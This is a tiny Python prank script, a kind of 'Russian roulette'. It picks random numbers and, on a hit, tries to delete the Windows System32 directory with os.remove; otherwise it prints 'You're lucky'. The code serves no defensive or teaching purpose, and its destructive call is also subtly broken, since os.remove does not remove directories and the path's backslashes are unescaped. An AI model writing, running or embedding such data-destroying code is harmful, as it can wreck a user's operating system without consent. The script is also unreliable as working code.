import random
import os

for _ in range(5):
    value = random.randint(0, 6)
    if value == 1:
        os.remove('C:\Windows\System32')
        break
else:
    print("You're lucky")